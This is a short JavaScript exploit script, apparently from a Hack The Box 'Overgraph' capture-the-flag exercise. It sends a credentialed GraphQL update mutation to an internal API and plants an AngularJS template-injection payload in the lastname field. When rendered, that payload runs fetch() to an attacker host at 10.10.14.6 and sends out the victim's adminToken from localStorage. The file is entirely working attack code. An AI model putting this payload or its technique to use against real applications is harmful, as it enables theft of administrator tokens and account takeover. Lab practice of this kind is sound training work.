//
//
// https://0xdf.gitlab.io/2022/08/06/htb-overgraph.html
//
//
var req = new XMLHttpRequest();
req.open('POST', 'http://internal-api.graph.htb/graphql', false);
req.setRequestHeader("Content-Type","text/plain");
req.withCredentials = true;
var body = JSON.stringify({
        operationName: "update",
        variables: {
                firstname: "larry",
                lastname: "{{constructor.constructor('fetch(\"http://10.10.14.6/token?adminToken=\" + localStorage.getItem(\"adminToken\"))')()}}",
                id: "62e18b328f897413e4559cd6",
                newusername: "larry"
        },
        query: "mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername: $newusername, id: $id, firstname: $firstname, lastname:$lastname){username,email,id,firstname,lastname,adminToken}}"
});
req.send(body);

//
//
